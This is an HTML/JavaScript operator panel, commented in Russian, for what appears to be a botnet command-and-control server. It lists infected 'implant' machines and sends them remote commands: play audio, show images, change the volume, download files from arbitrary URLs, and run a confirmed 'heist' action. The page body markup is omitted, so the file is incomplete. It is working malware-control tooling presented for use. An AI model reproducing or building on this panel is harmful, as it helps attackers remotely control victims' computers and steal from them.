<!DOCTYPE html>
<!-- Файл: index.html (Версия 6.5 - Инстинкт выживания) -->
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Коммандный Мостик v6.5</title>
    <style>
        :root {
            --bg-color: #1a1a1c;
            --primary-color: #2e2e33;
            --secondary-color: #45454d;
            --text-color: #e1e1e1;
            --accent-color: #00aaff;
            --action-color: #007bff;
            --danger-color: #dc3545;
            --error-color: #ff4d4d;
            --success-color: #33cc33;
        }
        
        html,
        body {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
        }
        
        .container {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        
        header {
            flex-shrink: 0;
            color: var(--accent-color);
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--secondary-color);
        }
        
        h1,
        h2,
        h3 {
            margin: 0;
        }
        
        h2 {
            color: var(--accent-color);
            padding-bottom: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--secondary-color);
        }
        
        h3 {
            margin-top: 20px;
            margin-bottom: 10px;
            text-align: center;
            border-top: 1px solid var(--secondary-color);
            padding-top: 20px;
        }
        
        .app-layout {
            display: flex;
            flex-grow: 1;
            overflow: hidden;
            padding: 25px;
            gap: 25px;
        }
        
        .sidebar {
            flex: 0 0 300px;
            background-color: var(--primary-color);
            border-radius: 12px;
            border: 1px solid var(--secondary-color);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .sidebar h2 {
            padding: 25px;
            margin: 0;
        }
        
        #bot-list {
            flex-grow: 1;
            overflow-y: auto;
            padding: 0 25px 25px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .main-content {
            flex-grow: 1;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        section {
            background-color: var(--primary-color);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--secondary-color);
            margin-bottom: 25px;
        }
        
        .log-container {
            flex-shrink: 0;
            height: 200px;
            background-color: #111;
            border-top: 1px solid var(--secondary-color);
            display: flex;
            flex-direction: column;
            font-family: 'Courier New', Courier, monospace;
            transition: height 0.3s ease;
        }
        
        .log-container.collapsed {
            height: 42px;
        }
        
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            background-color: var(--primary-color);
            cursor: pointer;
        }
        
        .log-header h3 {
            margin: 0;
            padding: 0;
            border: none;
            font-size: 1em;
        }
        
        #toggle-log-btn {
            padding: 2px 10px;
            font-size: 1.2em;
            line-height: 1;
            font-weight: bold;
            background-color: var(--secondary-color);
            border: none;
            cursor: pointer;
            border-radius: 4px;
        }
        
        #log-list {
            flex-grow: 1;
            overflow-y: auto;
            padding: 10px;
        }
        
        .log-entry {
            margin: 2px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .log-info {
            color: var(--text-color);
        }
        
        .log-success {
            color: var(--success-color);
        }
        
        .log-error {
            color: var(--error-color);
        }
        
        .log-command {
            color: var(--accent-color);
        }
        
        .log-timestamp {
            color: var(--secondary-color);
            margin-right: 10px;
        }
        
        button {
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            width: 100%;
            transition: background-color 0.2s;
            box-sizing: border-box;
        }
        
        button:hover {
            filter: brightness(1.2);
        }
        
        .btn-bot {
            background-color: #495057;
        }
        
        .btn-bot.selected {
            border: 3px solid var(--accent-color);
            background-color: #0056b3;
        }
        
        .btn-action {
            background-color: var(--action-color);
        }
        
        .btn-danger {
            background-color: var(--danger-color);
        }
        
        .grid-controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
        }
        
        .thumbnail-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 15px;
        }
        
        .thumbnail-item {
            text-align: center;
            cursor: pointer;
            background-color: var(--secondary-color);
            padding: 10px;
            border-radius: 8px;
        }
        
        .thumbnail-item img {
            width: 100px;
            height: 100px;
            object-fit: cover;
            border: 2px solid var(--bg-color);
            border-radius: 8px;
        }
        
        .thumbnail-item p {
            margin: 8px 0 0 0;
            font-size: 0.8em;
            word-wrap: break-word;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 8px;
            border: 1px solid var(--secondary-color);
            background-color: var(--bg-color);
            color: var(--text-color);
            box-sizing: border-box;
        }
        
        input[type="range"] {
            width: 100%;
        }
        
        .volume-control-wrapper {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        #volume-value {
            font-weight: bold;
            min-width: 40px;
            text-align: right;
        }
        
        @media (max-width: 900px) {
            .app-layout {
                flex-direction: column;
                padding: 15px;
            }
            .sidebar {
                flex: 0 0 auto;
                max-height: 30vh;
            }
            .log-container {
                height: 150px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <h1>Коммандный Мостик v6.5</h1></header>
        <main class="app-layout">
            <!-- ... (HTML остается без изменений) ... -->
        </main>
    </div>

    <script>
        // ==============================================================================
        // JAVASCRIPT-МОЗГ v6.5 (с инстинктом самосохранения)
        // ==============================================================================
        const ui = {
            botList: document.getElementById('bot-list'),
            controlsWrapper: document.getElementById('controls-wrapper'),
            selectedBotName: document.getElementById('selected-bot-name'),
            logList: document.getElementById('log-list'),
            audioFilesList: document.getElementById('audio-files-list'),
            imageFilesList: document.getElementById('image-files-list'),
            volumeSlider: document.getElementById('volume-slider'),
            muteButton: document.getElementById('mute-btn'),
            volumeValue: document.getElementById('volume-value'),
            urlInput: document.getElementById('url-input'),
            logContainer: document.querySelector('.log-container'),
            logHeader: document.getElementById('log-header')
        };
        let socket, selectedBotId = null,
            pingInterval = null,
            watchdogTimer = null;

        function log(message, type = 'info') {
            const now = new Date();
            const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
            ui.logList.appendChild(entry);
            ui.logList.scrollTop = ui.logList.scrollHeight;
        }

        function connect() {
            log("Подключение к C2...");
            // --- ПЕРЕД КАЖДОЙ ПОПЫТКОЙ УБИВАЕМ СТАРЫЕ ТАЙМЕРЫ ---
            if (pingInterval) clearInterval(pingInterval);
            if (watchdogTimer) clearTimeout(watchdogTimer);

            socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);

            socket.onopen = () => {
                log("Соединение установлено.", "success");
                socket.send(JSON.stringify({
                    type: 'operator'
                }));

                // --- ЗАПУСКАЕМ СЕРДЦЕБИЕНИЕ И СТОРОЖЕВОГО ПСА ---
                pingInterval = setInterval(() => {
                    if (socket.readyState === WebSocket.OPEN) {
                        socket.send('ping');
                        // Взводим таймер. Если через 10с не будет ответа, соединение - труп.
                        watchdogTimer = setTimeout(() => {
                            log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
                            socket.close(); // Это вызовет onclose и запустит переподключение
                        }, 10000);
                    }
                }, 25000);
            };

            socket.onmessage = (event) => {
                // --- ГЛАВНОЕ ИЗМЕНЕНИЕ: ОБРАБОТКА PONG ---
                if (event.data === 'pong') {
                    // Сервер жив. Гладим пса по голове (сбрасываем таймер).
                    if (watchdogTimer) clearTimeout(watchdogTimer);
                    return;
                }

                try {
                    const msg = JSON.parse(event.data);
                    switch (msg.type) {
                        case 'bot_list':
                            updateBotList(msg.data);
                            break;
                        case 'bot_details':
                            if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
                            break;
                        case 'status':
                            log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
                            break;
                        case 'volume_update':
                            if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
                            break;
                        case 'file_list_update':
                            if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
                            break;
                    }
                } catch (e) {
                    log(`Ошибка обработки сообщения от сервера: ${e}`, 'error');
                }
            };

            socket.onclose = () => {
                log("Соединение потеряно. Переподключение через 3 секунды...", "error");
                if (pingInterval) clearInterval(pingInterval);
                if (watchdogTimer) clearTimeout(watchdogTimer);
                selectBot(null);
                setTimeout(connect, 3000);
            };
        }

        // --- Остальной код без изменений, он уже стабилен ---
        function updateBotList(bots) {
            log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
            const savedBotId = localStorage.getItem('lastSelectedBot');
            const currentSelected = selectedBotId;
            ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
            bots.forEach(botId => {
                const btn = document.createElement('button');
                btn.textContent = botId.replace('implant_', '');
                btn.className = 'btn-bot';
                btn.onclick = () => selectBot(botId);
                ui.botList.appendChild(btn);
            });
            if (currentSelected && bots.includes(currentSelected)) {
                selectBot(currentSelected, false);
            } else if (savedBotId && bots.includes(savedBotId)) {
                selectBot(savedBotId, true);
            } else {
                selectBot(bots.length > 0 ? bots[0] : null, true);
            }
        }

        function selectBot(botId, requestDetails = true) {
            selectedBotId = botId;
            if (botId) {
                localStorage.setItem('lastSelectedBot', botId);
            } else {
                localStorage.removeItem('lastSelectedBot');
            }
            document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
                btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
            });
            if (botId) {
                ui.controlsWrapper.style.display = 'block';
                ui.selectedBotName.textContent = botId.replace('implant_', '');
                if (requestDetails) {
                    log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
                    socket.send(JSON.stringify({
                        type: 'get_details',
                        target_id: botId
                    }));
                }
            } else {
                ui.controlsWrapper.style.display = 'none';
            }
        }

        function handleBotDetails(data) {
            log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
            if (data.files) renderBotFiles(data.files);
            if (data.volume_state) updateVolumeUI(data.volume_state);
        }

        function updateVolumeUI(state) {
            log(`Синхронизация звука: Громкость ${state.level}%, Mute: ${state.is_muted}`, 'success');
            ui.volumeSlider.value = state.level;
            ui.volumeValue.textContent = `${state.level}%`;
            ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
            ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
        }

        function renderBotFiles(files) {
            const audioContainer = ui.audioFilesList;
            audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
            if (files.audio) files.audio.forEach(file => {
                const btn = document.createElement('button');
                btn.textContent = file;
                btn.className = 'btn-action';
                btn.onclick = () => sendCommand({
                    action: 'play',
                    filename: file
                });
                audioContainer.appendChild(btn);
            });
            const imageContainer = ui.imageFilesList;
            imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
            if (files.image) files.image.forEach(imgData => {
                const item = document.createElement('div');
                item.className = 'thumbnail-item';
                item.onclick = () => sendCommand({
                    action: 'show',
                    filename: imgData.filename
                });
                const imgElement = document.createElement('img');
                imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview';
                imgElement.alt = imgData.filename;
                const nameElement = document.createElement('p');
                nameElement.textContent = imgData.filename;
                item.appendChild(imgElement);
                item.appendChild(nameElement);
                imageContainer.appendChild(item);
            });
        }

        function sendCommand(payload) {
            if (!selectedBotId) return;
            if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
            socket.send(JSON.stringify({
                type: 'command',
                target_id: selectedBotId,
                payload
            }));
            log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
        }
        const debounce = (func, delay) => {
            let timeout;
            return (...args) => {
                clearTimeout(timeout);
                timeout = setTimeout(() => func(...args), delay);
            };
        };
        const debouncedSendVolume = debounce(value => sendCommand({
            action: 'volume',
            level: value
        }), 250);
        ui.volumeSlider.addEventListener('input', (event) => {
            const newLevel = event.target.value;
            ui.volumeValue.textContent = `${newLevel}%`;
            debouncedSendVolume(newLevel);
        });

        function downloadFile() {
            const url = ui.urlInput.value.trim();
            if (url) {
                sendCommand({
                    action: 'download',
                    url
                });
            }
        }
        ui.logHeader.addEventListener('click', () => {
            ui.logContainer.classList.toggle('collapsed');
        });

        connect();
    </script>
</body>

</html>
